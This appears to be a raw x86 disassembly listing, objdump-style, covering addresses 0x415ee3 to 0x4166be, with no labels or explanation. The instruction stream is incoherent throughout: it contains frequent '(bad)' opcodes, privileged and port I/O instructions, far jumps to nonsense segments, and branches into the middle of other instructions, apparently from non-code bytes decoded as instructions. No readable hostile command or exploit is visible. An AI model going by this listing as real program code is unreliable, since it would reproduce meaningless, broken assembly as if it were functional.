  415ee3:	adc    ebx,DWORD PTR [ecx-0x12]
  415ee6:	inc    esp
  415ee7:	out    dx,eax
  415ee8:	xchg   DWORD PTR [ebx-0x6871df4d],ebx
  415eee:	stos   DWORD PTR es:[edi],eax
  415eef:	data16 test al,0x5e
  415ef2:	xchg   BYTE PTR [edx-0x1f889174],dh
  415ef8:	pop    eax
  415ef9:	ss loopne 0x415e9c
  415efc:	jl     0x415e8a
  415efe:	jmp    0x415efc
  415f00:	sar    DWORD PTR [ebx],cl
  415f02:	inc    ecx
  415f03:	xchg   BYTE PTR [eax-0x44],cl
  415f06:	add    BYTE PTR [edi+0x3a],dh
  415f09:	or     ecx,DWORD PTR [ecx+0x64]
  415f0c:	xchg   DWORD PTR [ecx-0x62],ecx
  415f0f:	jnp    0x415ece
  415f11:	hlt    
  415f12:	imul   DWORD PTR [ebp-0x69c522ae]
  415f18:	cmp    eax,0xee4bef52
  415f1d:	sub    al,0x1d
  415f1f:	pop    ds
  415f20:	addr16 das 
  415f22:	xor    DWORD PTR [ecx+esi*8-0x2f4cbf43],eax
  415f29:	push   ds
  415f2a:	pusha  
  415f2b:	jno    0x415ed1
  415f2d:	stos   DWORD PTR es:[edi],eax
  415f2e:	sbb    cl,dl
  415f30:	or     al,0xc
  415f32:	ret    0x3564
  415f35:	mov    eax,ds:0x2ef9ef2
  415f3a:	sub    al,0xc1
  415f3c:	jle    0x415f67
  415f3e:	push   ss
  415f3f:	sub    DWORD PTR [edi-0x95f9f73],eax
  415f45:	ret    
  415f46:	aad    0x4b
  415f48:	add    eax,0xc66ed6cb
  415f4d:	leave  
  415f4e:	push   ebx
  415f4f:	popf   
  415f50:	push   esi
  415f51:	lods   eax,DWORD PTR ds:[esi]
  415f52:	aam    0x2
  415f54:	stos   DWORD PTR es:[edi],eax
  415f55:	call   0xb5ee:0xdca1a31f
  415f5c:	cmp    bl,al
  415f5e:	popf   
  415f5f:	cmp    eax,DWORD PTR [ecx]
  415f61:	jge    0x415f62
  415f63:	dec    edx
  415f64:	dec    ebp
  415f65:	sub    DWORD PTR [eax-0x5],esp
  415f68:	cwde   
  415f69:	test   eax,0xe912c230
  415f6e:	(bad)  
  415f6f:	xchg   edi,eax
  415f70:	test   DWORD PTR [ebp-0x6ed5f612],ecx
  415f76:	mov    cl,0x6b
  415f78:	psllw  mm5,mm5
  415f7b:	pop    DWORD PTR [ebp-0x5ff160d2]
  415f81:	fwait
  415f82:	pop    esi
  415f83:	(bad)  
  415f84:	mov    ecx,0xdb110dbd
  415f89:	push   DWORD PTR [ebx]
  415f8b:	nop    DWORD PTR [eax-0x144a74f8]
  415f92:	sti    
  415f93:	mov    eax,0x3a80bf2e
  415f98:	pop    ss
  415f99:	push   eax
  415f9a:	clc    
  415f9b:	jmp    0x7e74:0x6871a841
  415fa2:	outs   dx,BYTE PTR ds:[esi]
  415fa3:	cmp    ch,dl
  415fa5:	mov    esi,0xd339bce7
  415faa:	jecxz  0x415fae
  415fac:	push   cs
  415fad:	(bad)  
  415fae:	pop    ds
  415faf:	xchg   edx,eax
  415fb0:	out    dx,eax
  415fb1:	(bad)  
  415fb2:	call   0x95fb8727
  415fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fb8:	jno    0x416039
  415fba:	mov    dl,0xfd
  415fbc:	es jge 0x415f92
  415fbf:	pslld  mm0,QWORD PTR [edx+0x3456c84a]
  415fc6:	or     ah,cl
  415fc8:	dec    esp
  415fc9:	ins    BYTE PTR es:[edi],dx
  415fca:	lea    ebx,[edi]
  415fcc:	push   es
  415fcd:	pop    eax
  415fce:	inc    ecx
  415fcf:	jo     0x415f75
  415fd1:	(bad)  
  415fd2:	push   esi
  415fd3:	mov    ch,0xe6
  415fd5:	jp     0x415f86
  415fd7:	inc    esi
  415fd8:	push   es
  415fd9:	ins    DWORD PTR es:[edi],dx
  415fda:	aaa    
  415fdb:	test   BYTE PTR ds:0xa2821fb7,al
  415fe1:	cmp    al,0xb1
  415fe3:	cldemote BYTE PTR [ebx-0x34]
  415fe7:	mov    dl,0x38
  415fe9:	adc    ch,ch
  415feb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fec:	and    BYTE PTR [edx],dl
  415fee:	pop    esp
  415fef:	out    0xcf,al
  415ff1:	(bad)  
  415ff2:	shr    bh,cl
  415ff4:	mov    edi,DWORD PTR ss:[edi]
  415ff7:	cmp    bh,BYTE PTR fs:[esi-0x133d38e3]
  415ffe:	cdq    
  415fff:	pop    edx
  416000:	bound  esp,QWORD PTR [ebx-0x6d]
  416003:	cmp    DWORD PTR [edi-0x2062325c],0x473e8dac
  41600d:	xchg   esp,eax
  41600e:	mov    ecx,0x8c28a93c
  416013:	add    DWORD PTR [edi-0x27028406],ebp
  416019:	dec    esi
  41601a:	int3   
  41601b:	mov    dl,0xce
  41601d:	int    0xb2
  41601f:	retf   
  416020:	jnp    0x415fbf
  416022:	mov    dl,0xae
  416024:	push   es
  416025:	loope  0x416023
  416027:	jecxz  0x416070
  416029:	call   0x907f:0x2f52c461
  416030:	add    BYTE PTR [ebp+edx*4-0x144abd9c],0x3e
  416038:	cmp    dl,BYTE PTR [esi-0x53]
  41603b:	mov    bl,0x9c
  41603d:	xchg   DWORD PTR [ecx+0x71],ebp
  416040:	pop    esi
  416041:	popf   
  416042:	fwait
  416043:	shr    ah,cl
  416045:	sub    ebx,DWORD PTR [eax+ebp*1-0x36]
  416049:	cmp    ebx,DWORD PTR [esi+edi*1+0x3]
  41604d:	fidiv  WORD PTR [esi-0x3397da05]
  416053:	pop    ebx
  416054:	jle    0x416018
  416056:	mov    dl,0x0
  416058:	add    DWORD PTR [esi],edi
  41605a:	inc    ecx
  41605b:	sub    DWORD PTR [edx-0x3922e57d],esp
  416061:	call   0xadc9:0xcc2124e2
  416068:	mov    dh,0x3b
  41606a:	das    
  41606b:	push   edx
  41606c:	dec    ecx
  41606d:	leave  
  41606e:	sahf   
  41606f:	fs mov cl,0x3f
  416072:	loopne 0x4160e7
  416074:	xchg   edx,eax
  416075:	(bad)  
  416076:	sub    dl,BYTE PTR [ebx]
  416078:	xor    ebp,ebx
  41607a:	dec    ebx
  41607b:	mov    ch,ah
  41607d:	mov    bh,0xb2
  41607f:	push   ds
  416080:	jle    0x4160f4
  416082:	ret    
  416083:	jmp    0x44bb9d9e
  416088:	sahf   
  416089:	cmp    al,0x59
  41608b:	rol    al,1
  41608d:	adc    BYTE PTR [ebx+esi*1-0x5f],cl
  416091:	xchg   BYTE PTR [eax+esi*4+0x20f5312f],dl
  416098:	jae    0x41608c
  41609a:	xchg   ecx,eax
  41609b:	add    eax,0x6623d01a
  4160a0:	pushf  
  4160a1:	push   ebx
  4160a2:	ja     0x416113
  4160a4:	jmp    0x2d8017dd
  4160a9:	mov    cl,0xef
  4160ab:	xor    edi,edx
  4160ad:	test   BYTE PTR [eax+ebp*1+0x7f],al
  4160b1:	pop    eax
  4160b2:	xchg   esi,eax
  4160b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160b4:	loop   0x416070
  4160b6:	push   0x5e375323
  4160bb:	fisub  WORD PTR [eax+ebp*2]
  4160be:	jecxz  0x4160ce
  4160c0:	inc    edx
  4160c1:	repnz push 0x9b201d31
  4160c7:	push   eax
  4160c8:	jg     0x41612c
  4160ca:	push   ds
  4160cb:	(bad)  [ebx+ebx*2+0x36]
  4160cf:	sub    ebx,DWORD PTR [ebp+eiz*4+0x67]
  4160d3:	into   
  4160d4:	and    ebp,eax
  4160d6:	adc    al,ch
  4160d8:	scas   eax,DWORD PTR es:[edi]
  4160d9:	mov    bh,0xb9
  4160db:	xor    al,BYTE PTR [esp+esi*8-0xb5f0242]
  4160e2:	addr16 mov edi,0x42514a95
  4160e8:	and    dh,0xe3
  4160eb:	lods   eax,DWORD PTR ds:[esi]
  4160ec:	and    BYTE PTR [edi],ah
  4160ee:	std    
  4160ef:	daa    
  4160f0:	mov    bl,0x3
  4160f2:	mov    ds:0x761d6cff,eax
  4160f7:	pop    ebp
  4160f8:	fst    DWORD PTR [esi+0x42]
  4160fb:	ror    BYTE PTR [eax-0x5c],cl
  4160fe:	js     0x416098
  416100:	call   FWORD PTR [ebx-0x747e85a1]
  416106:	cmp    bl,BYTE PTR [edx]
  416108:	loope  0x41609c
  41610a:	test   eax,0x67275ba
  41610f:	ins    DWORD PTR es:[edi],dx
  416110:	sbb    eax,0x1626a4e5
  416115:	mov    esi,0xa6a634be
  41611a:	pop    ds
  41611b:	lahf   
  41611c:	pop    ss
  41611d:	int    0x8e
  41611f:	mov    bh,0xd0
  416121:	stos   DWORD PTR es:[edi],eax
  416122:	xchg   ecx,eax
  416123:	aam    0x9d
  416125:	retf   
  416126:	sub    al,0xf6
  416128:	mov    al,0x9a
  41612a:	into   
  41612b:	push   esi
  41612c:	xchg   al,cl
  41612e:	ins    BYTE PTR es:[edi],dx
  41612f:	or     eax,0xd9e41a8a
  416134:	sbb    ecx,0xffffff8a
  416137:	test   eax,0x17f6aa20
  41613c:	inc    esp
  41613d:	ror    al,1
  41613f:	imul   eax,DWORD PTR [edx-0x2f],0xf0d8e10f
  416146:	and    BYTE PTR [edi-0x1c],al
  416149:	xor    BYTE PTR [ebp+0x52],dl
  41614c:	xor    ebp,DWORD PTR [ebp+0x6f]
  41614f:	jbe    0x4161bc
  416151:	lods   eax,DWORD PTR ds:[esi]
  416152:	imul   BYTE PTR [edx-0x36]
  416155:	jmp    0x3bbc:0x3ce17d41
  41615c:	jns    0x41613a
  41615e:	xchg   BYTE PTR [edx],ah
  416160:	xchg   edi,eax
  416161:	and    eax,eax
  416163:	js     0x416146
  416165:	js     0x4161c2
  416167:	into   
  416168:	sub    cl,BYTE PTR [ebx-0x25]
  41616b:	inc    esi
  41616c:	retf   
  41616d:	sahf   
  41616e:	ret    
  41616f:	in     al,dx
  416170:	push   edi
  416171:	or     edx,ecx
  416173:	add    BYTE PTR [ebx+0x59],0xca
  416177:	dec    BYTE PTR [ecx]
  416179:	popf   
  41617a:	(bad)  
  41617b:	jmp    0x4161dd
  41617d:	push   0x65
  41617f:	jle    0x4161a3
  416181:	xchg   esi,eax
  416182:	data16 adc al,0x68
  416185:	jne    0x416203
  416187:	test   al,0xf1
  416189:	inc    ebx
  41618a:	loop   0x416202
  41618c:	and    dh,BYTE PTR [ecx+edi*1+0x56]
  416190:	in     eax,0x33
  416192:	(bad)  
  416193:	jns    0x416146
  416195:	mov    WORD PTR [edx+0x3],cs
  416198:	pop    es
  416199:	push   ebp
  41619a:	fwait
  41619b:	dec    ebx
  41619c:	pop    ecx
  41619d:	ss es repnz xor ax,0x849b
  4161a4:	out    0x92,al
  4161a6:	mov    eax,ds:0x28048aee
  4161ab:	stos   BYTE PTR es:[edi],al
  4161ac:	inc    eax
  4161ad:	jmp    0xdd33:0x5e52f434
  4161b4:	jbe    0x416153
  4161b6:	pushf  
  4161b7:	push   ss
  4161b8:	ret    0x87de
  4161bb:	push   ss
  4161bc:	xor    ebp,DWORD PTR [edx+0x52]
  4161bf:	inc    eax
  4161c0:	pop    ebx
  4161c1:	ror    dl,1
  4161c3:	cmp    eax,0x59c8f4aa
  4161c8:	fwait
  4161c9:	lahf   
  4161ca:	fadd   DWORD PTR [di]
  4161cd:	sbb    eax,0x998ebb5
  4161d2:	mov    ss,WORD PTR [ecx]
  4161d4:	sub    al,0x33
  4161d6:	dec    ebp
  4161d7:	je     0x416162
  4161d9:	int    0x73
  4161db:	push   0x1c
  4161dd:	jmp    0x41623c
  4161df:	jge    0x416227
  4161e1:	pop    ecx
  4161e2:	push   0x53ef591f
  4161e7:	inc    edi
  4161e8:	ds out 0x8e,eax
  4161eb:	xor    ah,bh
  4161ed:	lock mov dl,0x4a
  4161f0:	pop    eax
  4161f1:	leave  
  4161f2:	mov    ch,0x2c
  4161f4:	sbb    eax,DWORD PTR [edi-0x2c]
  4161f7:	mov    BYTE PTR [ebp-0x40],ah
  4161fa:	repz popf 
  4161fc:	and    BYTE PTR [edx-0x6cea86],ah
  416202:	jb     0x416215
  416204:	dec    ebp
  416205:	ins    BYTE PTR es:[edi],dx
  416206:	rol    BYTE PTR [ebx],0x89
  416209:	popf   
  41620a:	push   cs
  41620b:	jle    0x416265
  41620d:	aaa    
  41620e:	mov    ebx,0x7b8d2e93
  416213:	scas   al,BYTE PTR es:[edi]
  416214:	ror    DWORD PTR [esi-0xe],cl
  416217:	cdq    
  416218:	cmp    eax,DWORD PTR [ecx+0x5]
  41621b:	jmp    0xcb69:0xc10c3bde
  416222:	mov    esp,0x56e37caa
  416227:	cli    
  416228:	retf   
  416229:	iret   
  41622a:	retf   
  41622b:	pop    es
  41622c:	in     eax,0x48
  41622e:	or     DWORD PTR [ebx],ebp
  416230:	scas   al,BYTE PTR es:[edi]
  416231:	mov    WORD PTR [esi+ecx*8],ss
  416234:	sub    BYTE PTR [esi+0x25],0x94
  416238:	lock jle 0x416225
  41623b:	mov    ds:0x63506a,eax
  416240:	mov    BYTE PTR [esi-0x60178034],ch
  416246:	add    edx,ecx
  416248:	inc    edx
  416249:	mov    DWORD PTR [edi+edx*2+0x54df1623],ecx
  416250:	test   DWORD PTR [esi],edi
  416252:	xor    ch,BYTE PTR [edi+0x1f]
  416255:	mov    ch,0x2f
  416257:	out    0x1c,al
  416259:	jb     0x41620a
  41625b:	js     0x416231
  41625d:	mov    ebp,0x85693536
  416262:	out    0x42,al
  416264:	dec    bx
  416266:	call   0x3284d0e1
  41626b:	xor    eax,0x37b822f2
  416270:	pop    ebx
  416271:	(bad)  
  416272:	in     eax,0x72
  416274:	cdq    
  416275:	jl     0x4162c4
  416277:	fdivr  DWORD PTR [edi+0x1e444334]
  41627d:	fistp  DWORD PTR [edi-0x6]
  416280:	mov    esi,0x3b0239cd
  416285:	or     al,0x64
  416287:	cmp    al,0xce
  416289:	xor    DWORD PTR [esi],ebp
  41628b:	add    edx,eax
  41628d:	inc    edx
  41628e:	mov    dh,0xaf
  416290:	cmp    eax,DWORD PTR [eax]
  416292:	cwde   
  416293:	push   eax
  416294:	and    BYTE PTR [eax-0x1f436f4e],dl
  41629a:	leave  
  41629b:	dec    ecx
  41629c:	mov    esp,0x95d2df05
  4162a1:	loop   0x41629c
  4162a3:	and    al,0x35
  4162a5:	inc    edx
  4162a6:	jle    0x4162f5
  4162a8:	test   DWORD PTR [ecx-0x8],0x94dc2192
  4162af:	cvttps2pi mm4,xmm5
  4162b2:	sub    bl,BYTE PTR [ecx-0x21]
  4162b5:	(bad)  
  4162b6:	or     DWORD PTR ds:0xefa6d853,ecx
  4162bc:	push   ecx
  4162bd:	inc    esp
  4162be:	data16 lahf 
  4162c0:	and    ecx,DWORD PTR [esi]
  4162c2:	push   ebx
  4162c3:	dec    esi
  4162c4:	paddsw mm1,QWORD PTR [eax+0x1f]
  4162c8:	dec    edi
  4162c9:	push   ebx
  4162ca:	pop    esp
  4162cb:	push   ecx
  4162cc:	cmp    dh,dh
  4162ce:	mov    esp,0xe00ea87b
  4162d3:	fwait
  4162d4:	stos   BYTE PTR es:[edi],al
  4162d5:	pop    ecx
  4162d6:	stos   BYTE PTR es:[edi],al
  4162d7:	sub    DWORD PTR [ecx],eax
  4162d9:	inc    esi
  4162da:	pop    esi
  4162db:	pop    edx
  4162dc:	jge    0x4162e2
  4162de:	nop
  4162df:	mov    ebp,DWORD PTR [ecx+0x69d75255]
  4162e5:	loopne 0x41628d
  4162e7:	mov    bh,0xcf
  4162e9:	add    al,0x74
  4162eb:	or     BYTE PTR [ebx],0xc
  4162ee:	loope  0x416321
  4162f0:	sub    eax,0x1aa0018c
  4162f5:	cmp    BYTE PTR [ecx+0x1c],dh
  4162f8:	fild   DWORD PTR [ebp-0x6129823e]
  4162fe:	jno    0x416327
  416300:	(bad)  
  416301:	cmp    DWORD PTR ds:0x4fd5a674,edi
  416307:	jo     0x41629c
  416309:	lahf   
  41630a:	and    bh,cl
  41630c:	data16 mov ah,0x82
  41630f:	int    0xbb
  416311:	xchg   edi,eax
  416312:	dec    ebx
  416313:	cmp    ecx,ecx
  416315:	lahf   
  416316:	stos   DWORD PTR es:[edi],eax
  416317:	push   esi
  416318:	inc    ebx
  416319:	push   cs
  41631a:	sub    BYTE PTR [eax+0x6],ch
  41631d:	repnz mov ebx,DWORD PTR [edi+0x13a3e40c]
  416324:	jecxz  0x416353
  416326:	hlt    
  416327:	adc    DWORD PTR [edx+0x22],edx
  41632a:	retf   0x37d0
  41632d:	sti    
  41632e:	inc    ebp
  41632f:	mov    bl,0x52
  416331:	aad    0x9a
  416333:	aad    0xa2
  416335:	lods   eax,DWORD PTR ds:[esi]
  416336:	test   al,0x6b
  416338:	scas   al,BYTE PTR es:[edi]
  416339:	jo     0x627754ac
  41633f:	sahf   
  416340:	rcr    BYTE PTR ss:[esi+ebx*2-0x2bf92f38],0x24
  416349:	adc    al,0xb9
  41634b:	aam    0x3f
  41634d:	loope  0x4162e7
  41634f:	pusha  
  416350:	mov    edi,0x4fa739e1
  416355:	rol    esi,0xec
  416358:	jae    0x4163b1
  41635a:	xor    bl,BYTE PTR [edi]
  41635c:	mov    esp,0x77b3f101
  416361:	js     0x4163d8
  416363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416364:	mov    ds:0x1c3414f,eax
  416369:	and    ch,BYTE PTR [eax-0x24b362d1]
  41636f:	das    
  416370:	adc    edi,DWORD PTR [ebx-0x57]
  416373:	mov    esp,DWORD PTR [esi-0x3a]
  416376:	xchg   DWORD PTR [ecx-0xdcae5d6],edi
  41637c:	and    BYTE PTR [ebp+eiz*4+0x40],cl
  416380:	fwait
  416381:	(bad)  
  416382:	jge    0x4163e8
  416384:	dec    edi
  416385:	cdq    
  416386:	fcomi  st,st(4)
  416388:	add    eax,0xb4caad03
  41638d:	jmp    0x9fd7f643
  416392:	fcom   DWORD PTR [ebx+esi*1]
  416395:	mov    ecx,DWORD PTR [edi+0x81f73d4]
  41639b:	sub    ch,cl
  41639d:	dec    edi
  41639e:	int3   
  41639f:	imul   edx,DWORD PTR [ebp-0xf741075],0xd3488223
  4163a9:	adc    eax,0x4da70e7b
  4163ae:	jae    0x416350
  4163b0:	ins    BYTE PTR es:[edi],dx
  4163b1:	call   esp
  4163b3:	inc    ecx
  4163b4:	iret   
  4163b5:	inc    ecx
  4163b6:	lock stc 
  4163b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163b9:	pop    edi
  4163ba:	xchg   ebx,eax
  4163bb:	mov    cl,0x5e
  4163bd:	or     eax,0xf1dcfa79
  4163c2:	mov    cl,0xaa
  4163c4:	jl     0x4163a2
  4163c6:	repnz cld 
  4163c8:	lods   eax,DWORD PTR ds:[esi]
  4163c9:	cmp    BYTE PTR [ebx+0x3e],dh
  4163cc:	ficomp DWORD PTR [edi+esi*1-0x38]
  4163d0:	loope  0x4163a6
  4163d2:	sahf   
  4163d3:	outs   dx,BYTE PTR ds:[esi]
  4163d4:	hlt    
  4163d5:	jnp    0x416429
  4163d7:	popf   
  4163d8:	push   0xc5bd1459
  4163dd:	jo     0x4163a0
  4163df:	ret    
  4163e0:	add    edx,DWORD PTR [ecx+0x5f]
  4163e3:	repz adc eax,0x27351832
  4163e9:	pop    ebx
  4163ea:	std    
  4163eb:	push   ebp
  4163ec:	inc    edi
  4163ed:	mov    ebp,0x78fc6eaf
  4163f2:	xchg   dh,al
  4163f4:	push   ebx
  4163f5:	arpl   WORD PTR [ecx+0x28d045e7],di
  4163fb:	test   eax,0x2134bf4a
  416400:	shr    BYTE PTR [ebx+eiz*4+0x1b],cl
  416404:	test   al,0xb6
  416406:	cdq    
  416407:	aad    0x43
  416409:	repnz mov es,WORD PTR [esi]
  41640c:	(bad)  
  41640d:	imul   eax,DWORD PTR [eax+0x2a04a87d],0x12
  416414:	(bad)  
  416416:	cdq    
  416417:	xchg   esp,eax
  416418:	and    DWORD PTR [ebp+0x74],esp
  41641b:	sti    
  41641c:	mov    ds:0xc002958,al
  416421:	add    cl,al
  416423:	add    al,0xa8
  416425:	add    eax,0xa34e7bc7
  41642a:	mov    ebx,0xbc1ca95f
  41642f:	jmp    0x416486
  416431:	inc    ecx
  416432:	cwde   
  416433:	fnstcw WORD PTR [esi]
  416435:	pop    ecx
  416436:	fst    QWORD PTR [ebp+ebx*1-0xed935b9]
  41643d:	add    dl,0x9
  416440:	stos   BYTE PTR es:[edi],al
  416441:	dec    ebx
  416442:	xor    bl,bl
  416444:	(bad)  
  416446:	retf   
  416447:	mov    edi,0x940d9f2a
  41644c:	(bad)  [edx+edi*2+0x46a473e7]
  416453:	xchg   esp,eax
  416454:	in     eax,dx
  416455:	jecxz  0x41645b
  416457:	mov    fs,WORD PTR [ebp-0x58]
  41645a:	sbb    ch,BYTE PTR [edi]
  41645c:	stc    
  41645d:	mov    edi,0x3fb17ec3
  416462:	mov    ecx,0xca92df81
  416467:	pop    ecx
  416468:	aaa    
  416469:	popf   
  41646a:	rcl    DWORD PTR [edi-0xa],0x16
  41646e:	pop    eax
  41646f:	jp     0x4164ef
  416471:	cmp    ecx,DWORD PTR ds:0xf9268240
  416477:	inc    esi
  416478:	mov    al,0x35
  41647a:	xchg   edx,eax
  41647b:	shl    BYTE PTR [eax],0x1f
  41647e:	mov    esp,0xa01a9f55
  416483:	xor    al,0xa3
  416485:	jmp    0x6e58fcd
  41648a:	jae    0x416472
  41648c:	test   al,0x64
  41648e:	es fmul st,st(1)
  416491:	nop
  416492:	das    
  416493:	inc    eax
  416494:	mov    ebp,0xcbfc329b
  416499:	lahf   
  41649a:	in     al,dx
  41649b:	xor    al,0x0
  41649d:	push   0x67a856a8
  4164a2:	mov    al,ds:0xa4eaddf6
  4164a7:	fwait
  4164a8:	out    0x70,al
  4164aa:	jg     0x4164f3
  4164ac:	ficom  WORD PTR [ecx-0x2994a721]
  4164b2:	stos   DWORD PTR es:[edi],eax
  4164b3:	jmp    0x416463
  4164b5:	push   ecx
  4164b6:	inc    eax
  4164b7:	mov    BYTE PTR ds:0x72e9977a,ah
  4164bd:	ins    BYTE PTR es:[edi],dx
  4164be:	repnz in al,dx
  4164c0:	lea    ebx,[ebx-0x22]
  4164c3:	pusha  
  4164c4:	pop    edi
  4164c5:	sahf   
  4164c6:	sbb    ebx,esp
  4164c8:	sub    ch,BYTE PTR [ebp-0x8d228d6]
  4164ce:	push   0x7d9b87b3
  4164d3:	push   esp
  4164d4:	retf   0xf242
  4164d7:	lock mov edi,0xa660589f
  4164dd:	jle    0x4164d8
  4164df:	aad    0x49
  4164e1:	in     eax,dx
  4164e2:	push   ecx
  4164e3:	iret   
  4164e4:	cmp    bh,BYTE PTR [esi-0x61e84c3a]
  4164ea:	fwait
  4164eb:	jmp    0x4534e44c
  4164f0:	inc    edi
  4164f1:	xor    al,0xdc
  4164f3:	or     al,0x3f
  4164f5:	adc    edi,0x6a
  4164f8:	inc    edx
  4164f9:	ins    DWORD PTR es:[edi],dx
  4164fa:	scas   eax,DWORD PTR es:[edi]
  4164fb:	xor    esi,DWORD PTR [eax-0x34]
  4164fe:	cwde   
  4164ff:	cmp    DWORD PTR [esi],eax
  416501:	and    al,0x70
  416503:	test   DWORD PTR [ebx+0x24],0xc2e98337
  41650a:	push   ss
  41650b:	push   ecx
  41650c:	popa   
  41650d:	push   esp
  41650e:	inc    edx
  41650f:	or     dh,BYTE PTR [edi+0x306cfebf]
  416515:	retf   0xee1a
  416518:	mov    ecx,0x62881756
  41651d:	push   edi
  41651e:	mov    eax,0xde657fcf
  416523:	sub    eax,0xde214680
  416528:	push   ecx
  416529:	jbe    0x416544
  41652b:	sub    al,0xff
  41652d:	(bad)  
  41652e:	pop    ebp
  41652f:	lds    eax,FWORD PTR [ecx+0x7b]
  416532:	mov    ah,0x69
  416534:	mov    al,0x1c
  416536:	sub    BYTE PTR [edi+0x694ac88e],dl
  41653c:	jp     0x416538
  41653e:	aad    0x9b
  416540:	mov    bh,0xf5
  416542:	add    ch,bh
  416544:	cmp    DWORD PTR [ebx],eax
  416546:	and    bl,BYTE PTR [ebx]
  416548:	call   FWORD PTR [ebx+0x1a]
  41654b:	dec    ecx
  41654c:	mov    ebx,0xfcfb8ab6
  416551:	js     0x416543
  416553:	or     eax,0x5cd26c0d
  416558:	pop    esi
  416559:	mov    ebp,ecx
  41655b:	xor    BYTE PTR [ebx-0x418e4aef],ch
  416561:	pop    es
  416562:	std    
  416563:	cmp    eax,eax
  416565:	(bad)  
  416567:	dec    edx
  416568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416569:	push   edx
  41656a:	lods   eax,DWORD PTR ds:[esi]
  41656b:	inc    edi
  41656c:	fldcw  WORD PTR [eax]
  41656e:	sub    esi,ebp
  416570:	adc    BYTE PTR ds:0x34c86ba7,ah
  416576:	sbb    al,BYTE PTR [ecx+ebx*2]
  416579:	cdq    
  41657a:	imul   eax,DWORD PTR [eax],0x6e
  41657d:	jb     0x41655b
  41657f:	or     esp,DWORD PTR [ebx]
  416581:	mov    eax,ds:0xbfa5d300
  416586:	ss stos DWORD PTR es:[edi],eax
  416588:	inc    esi
  416589:	xlat   BYTE PTR ds:[ebx]
  41658a:	call   0x21eb:0x7d3a2c24
  416591:	inc    ecx
  416592:	jns    0x41658b
  416594:	out    0x42,eax
  416596:	inc    esi
  416597:	cmp    eax,0x8f373a66
  41659c:	add    eax,0xfb3c8ed
  4165a1:	aad    0xa1
  4165a3:	out    dx,al
  4165a4:	int    0xce
  4165a6:	mov    ecx,0xd78453d8
  4165ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165ac:	sub    DWORD PTR [ecx+0x69],ebx
  4165af:	sbb    bl,BYTE PTR [esi+ecx*4-0x64]
  4165b3:	cs adc ah,ch
  4165b6:	adc    al,0xba
  4165b8:	rol    esp,cl
  4165ba:	hlt    
  4165bb:	lahf   
  4165bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165bd:	sti    
  4165be:	imul   esp,DWORD PTR ds:0x55b929d5,0x6aeef8c4
  4165c8:	xor    BYTE PTR [ebp+0x7831d828],bh
  4165ce:	dec    edi
  4165cf:	mov    ch,0xe2
  4165d1:	iret   
  4165d2:	in     al,0xd1
  4165d4:	pop    edi
  4165d5:	inc    edi
  4165d6:	pop    ds
  4165d7:	pusha  
  4165d8:	sub    BYTE PTR [esi],0x9b
  4165db:	sbb    BYTE PTR [ebx+0x2f],ah
  4165de:	sbb    esp,DWORD PTR [ebx-0x2]
  4165e1:	shl    BYTE PTR [ebp+edi*2+0x22],cl
  4165e5:	je     0x4165ef
  4165e7:	mov    eax,0x12b3d802
  4165ec:	inc    esi
  4165ed:	ins    DWORD PTR es:[edi],dx
  4165ee:	aam    0x64
  4165f0:	nop
  4165f1:	enter  0xc4d1,0xa3
  4165f5:	push   ds
  4165f6:	loope  0x416593
  4165f8:	push   ebx
  4165f9:	out    0x99,eax
  4165fb:	out    dx,eax
  4165fc:	sub    DWORD PTR [edx-0x37],esi
  4165ff:	std    
  416600:	in     eax,dx
  416601:	xchg   esp,eax
  416602:	add    ah,BYTE PTR [ebp-0x37a7f08c]
  416608:	retf   0x6eda
  41660b:	fwait
  41660c:	add    ecx,esi
  41660e:	mov    eax,0x2ccc9659
  416613:	inc    edx
  416614:	jns    0x416629
  416616:	cmp    ecx,0x10
  416619:	into   
  41661a:	arpl   WORD PTR [eax+0x17e5c052],di
  416620:	mov    ebx,DWORD PTR [ecx-0x661d5528]
  416626:	out    dx,eax
  416627:	jge    0x416632
  416629:	cmp    ebx,edi
  41662b:	mov    edx,ebp
  41662d:	cmp    BYTE PTR [ebp+ebx*2-0x60681548],bh
  416634:	ret    0x43be
  416637:	inc    DWORD PTR [esi+0x5d]
  41663a:	adc    eax,0x6a75c342
  41663f:	popf   
  416640:	sahf   
  416641:	test   BYTE PTR [eax-0x71],ch
  416644:	rcl    BYTE PTR [ebx],cl
  416646:	or     al,0x4f
  416648:	mov    edi,0xb1a18c1c
  41664d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41664e:	cdq    
  41664f:	mov    gs,WORD PTR [ebx]
  416651:	push   0x35373540
  416656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416657:	scas   al,BYTE PTR es:[edi]
  416658:	fidivr DWORD PTR ds:0xa0ce3e93
  41665e:	cmp    bl,bh
  416660:	test   al,0x1a
  416662:	mov    edx,0x8597bb59
  416667:	adc    al,0xd3
  416669:	lods   al,BYTE PTR ds:[esi]
  41666a:	pop    esi
  41666b:	pop    ebx
  41666c:	push   cs
  41666d:	jne    0x41668f
  41666f:	mov    dl,0x7f
  416671:	daa    
  416672:	pop    ebp
  416673:	sbb    DWORD PTR [edx*8+0x5859a0de],edi
  41667a:	sub    eax,0x2f714b94
  41667f:	jp     0x416617
  416681:	pop    edi
  416682:	add    ebp,0x3c1b79bc
  416688:	mov    ds:0xfcb2e24b,al
  41668d:	hlt    
  41668e:	imul   BYTE PTR [edi]
  416690:	ja     0x4166ea
  416692:	popa   
  416693:	inc    edi
  416694:	sbb    esi,esi
  416696:	dec    edx
  416697:	sbb    bh,BYTE PTR [eax]
  416699:	inc    edx
  41669a:	sub    esp,DWORD PTR es:[eax]
  41669d:	dec    ebx
  41669e:	sub    esi,DWORD PTR [ecx+0x19038e3d]
  4166a4:	out    dx,eax
  4166a5:	jae    0x4166dd
  4166a7:	inc    ebp
  4166a8:	(bad)  
  4166a9:	cmp    esp,DWORD PTR [ebp-0x56301c3d]
  4166af:	shr    BYTE PTR [ebx-0x5d51a509],0x0
  4166b6:	(bad)  
  4166b8:	xor    eax,0xd33a29d3
  4166bd:	push   esi
  4166be:	ja     0x416661
